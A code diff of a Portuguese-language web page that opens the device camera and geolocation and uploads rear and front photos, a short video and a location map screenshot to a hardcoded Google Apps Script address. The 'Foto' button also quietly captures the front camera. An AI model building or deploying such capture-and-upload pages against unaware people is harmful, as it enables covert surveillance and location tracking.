@@ -2,7 +2,10 @@
 <html>
 <head> 
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Comparação Google Maps</title>
+  <title>Monitoramento + GPS + Captura do Mapa</title>
+
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+
   <style>
     body {
       font-family: Arial;
@@ -10,11 +13,10 @@
       text-align: center;
     }
 
-    #mapImage {
+    video {
       width: 100%;
       border-radius: 12px;
-      margin-top: 16px;
-      border: 1px solid #ccc;
+      background: #000;
     }
 
     button {
@@ -24,81 +26,168 @@
       margin-top: 12px;
       border: none;
       border-radius: 12px;
-      background: #dbeafe;
+    }
+
+    .photo-btn { background: #dbeafe; }
+    .video-btn { background: #d1fae5; }
+    .map-btn { background: #fecaca; }
+
+    #map {
+      height: 300px;
+      width: 100%;
+      margin-top: 16px;
+      border-radius: 12px;
     }
   </style>
 </head>
 <body>
-  <h2>🗺️ Google Maps Static + Captura</h2>
+  <h2>📸🎥📍 Monitoramento Completo</h2>
 
-  <img id="mapImage" alt="Mapa da localização"/>
+  <video id="video" autoplay playsinline muted></video>
 
-  <button onclick="captureMap()">
-    📍 Capturar imagem do mapa
+  <button class="photo-btn" onclick="captureBoth()">📸 Foto</button>
+  <button class="video-btn" onclick="captureVideo()">🎥 Vídeo</button>
+
+  <div id="map"></div>
+
+  <button class="map-btn" onclick="captureMap()">
+    📍 Capturar mapa
   </button>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 
 <script>
 const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxj9Bqd1jNqNqCx8uPEFABYbAOZ08g4nSjwcxgyTqhpxfqpjREv4YlDZuIBB2pqPeUOug/exec";
 
-// 🔑 coloque aqui sua chave do Google Maps Static API
-const GOOGLE_MAPS_KEY = "SUA_API_KEY_AQUI";
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
+let currentStream = null;
+let map, marker;
 let currentLat = null;
 let currentLng = null;
 
-function loadGoogleMap(lat, lng) {
-  const mapUrl =
-    `https://maps.googleapis.com/maps/api/staticmap` +
-    `?center=${lat},${lng}` +
-    `&zoom=17` +
-    `&size=800x400` +
-    `&maptype=roadmap` +
-    `&markers=color:red%7Clabel:C%7C${lat},${lng}` +
-    `&key=${GOOGLE_MAPS_KEY}`;
+async function startCamera(mode = "environment") {
+  if (currentStream) {
+    currentStream.getTracks().forEach(track => track.stop());
+  }
 
-  document.getElementById("mapImage").src = mapUrl;
+  currentStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: mode },
+    audio: false
+  });
+
+  video.srcObject = currentStream;
+  await video.play();
+  await new Promise(resolve => setTimeout(resolve, 1000));
+}
+
+function initMap(lat, lng) {
+  if (!map) {
+    map = L.map("map").setView([lat, lng], 17);
+
+    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+      maxZoom: 19
+    }).addTo(map);
+
+    const carIcon = L.divIcon({
+      html: '<div style="font-size:32px;">🚗</div>',
+      className: ""
+    });
+
+    marker = L.marker([lat, lng], { icon: carIcon }).addTo(map);
+  } else {
+    map.setView([lat, lng], 17);
+    marker.setLatLng([lat, lng]);
+  }
 }
 
 function getLocation() {
   navigator.geolocation.getCurrentPosition(position => {
     currentLat = position.coords.latitude;
     currentLng = position.coords.longitude;
-
-    loadGoogleMap(currentLat, currentLng);
+    initMap(currentLat, currentLng);
   });
 }
 
-async function captureMap() {
-  try {
-    const img = document.getElementById("mapImage");
+function captureImage() {
+  canvas.width = video.videoWidth || 1280;
+  canvas.height = video.videoHeight || 720;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+  return canvas.toDataURL("image/jpeg", 0.8);
+}
 
-    const response = await fetch(img.src);
-    const blob = await response.blob();
+function sendPayload(payload) {
+  return fetch(SCRIPT_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain;charset=utf-8"
+    },
+    body: JSON.stringify(payload)
+  });
+}
 
+async function captureBoth() {
+  await startCamera("environment");
+  const rear = captureImage();
+  await sendPayload({ image: rear, label: "camera_traseira" });
+
+  await startCamera("user");
+  const front = captureImage();
+  await sendPayload({ image: front, label: "camera_frontal" });
+
+  await startCamera("environment");
+  alert("✅ Fotos enviadas");
+}
+
+async function captureVideo() {
+  await startCamera("environment");
+
+  const chunks = [];
+  const recorder = new MediaRecorder(currentStream);
+
+  recorder.ondataavailable = e => {
+    if (e.data.size > 0) chunks.push(e.data);
+  };
+
+  recorder.onstop = () => {
+    const blob = new Blob(chunks, { type: "video/webm" });
     const reader = new FileReader();
+
     reader.onloadend = async () => {
-      await fetch(SCRIPT_URL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "text/plain;charset=utf-8"
-        },
-        body: JSON.stringify({
-          mapImage: reader.result,
-          label: "mapa_google"
-        })
+      await sendPayload({
+        video: reader.result,
+        label: "video"
       });
 
-      alert("✅ Captura do mapa enviada");
+      alert("✅ Vídeo enviado");
     };
 
     reader.readAsDataURL(blob);
+  };
 
-  } catch (error) {
-    console.error(error);
-    alert("❌ Erro ao capturar mapa");
-  }
+  recorder.start();
+  setTimeout(() => recorder.stop(), 2000);
 }
 
+async function captureMap() {
+  const mapElement = document.getElementById("map");
+
+  const canvasMap = await html2canvas(mapElement);
+  const image = canvasMap.toDataURL("image/png");
+
+  await sendPayload({
+    mapImage: image,
+    label: "mapa_openstreet"
+  });
+
+  alert("✅ Captura do mapa enviada");
+}
+
+startCamera("environment");
 getLocation();
 </script>
 </body>
